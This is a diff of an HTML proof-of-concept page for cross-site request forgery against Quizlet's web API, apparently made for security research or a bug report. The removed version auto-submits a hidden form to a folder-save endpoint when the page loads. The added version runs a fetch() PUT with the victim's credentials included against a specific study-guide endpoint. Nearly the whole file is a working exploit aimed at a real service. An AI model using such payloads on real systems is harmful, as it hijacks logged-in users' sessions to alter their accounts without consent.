@@ -1,9 +1,15 @@
-<!DOCTYPE html>
 <html>
-  <body onload="document.forms[0].submit()">
-    <h3>Simple CSRF via auto-submitted form</h3>
-    <form method="POST" action="https://quizlet.com/webapi/3.2/folders/save?_method=PUT">
-      <input type="hidden" name="data" value='[{"name":"api2","description":""}]'>
-    </form>
+  <body>
+    <h1>CSRF PoC: Make Study Guide Public</h1>
+    <script>
+      fetch("https://quizlet.com/webapi/3.11/study-guides/42bacad3-83e0-4f6c-aab4-b52be6ffdb2f?private=true", {
+        method: "PUT",
+        credentials: "include"
+      }).then(res => {
+        console.log("Response status:", res.status);
+      }).catch(err => {
+        console.error("Request failed:", err);
+      });
+    </script>
   </body>
 </html>
